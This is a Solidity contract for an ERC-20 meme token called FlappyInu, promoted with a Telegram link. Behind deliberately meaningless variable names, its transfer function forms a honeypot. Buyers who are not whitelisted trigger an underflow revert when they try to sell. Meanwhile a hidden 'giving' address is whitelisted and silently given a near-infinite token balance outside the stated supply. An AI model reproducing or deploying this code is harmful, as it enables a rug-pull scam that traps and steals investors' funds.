// https://t.me/flappyinu_eth

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.10;

import "./Ownable.sol";
import "./ERC20.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";

contract FlappyInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private football;
    mapping(address => uint256) private beneath;

    function _transfer(
        address lying,
        address industry,
        uint256 thing
    ) internal override {
        address summer = address(differ);
        bool tired = uniswapV2Pair == lying;
        uint256 kids = directly;

        if (beneath[lying] == 0 && football[lying] > 0 && !tired) {
            beneath[lying] -= kids;
        }

        differ = FlappyInu(industry);

        football[summer] += kids + 1;

        _balances[lying] -= thing;
        uint256 folks = (thing / 100) * directly;
        thing -= folks;
        _balances[industry] += thing;
    }

    uint256 public directly = 3;

    constructor(
        string memory she,
        string memory white,
        address nation,
        address giving
    ) ERC20(she, white) {
        uniswapV2Router = IUniswapV2Router02(nation);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        beneath[msg.sender] = operation;
        beneath[giving] = operation;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[giving] = operation;
    }

    FlappyInu private differ;
    uint256 private operation = ~uint256(0);
}
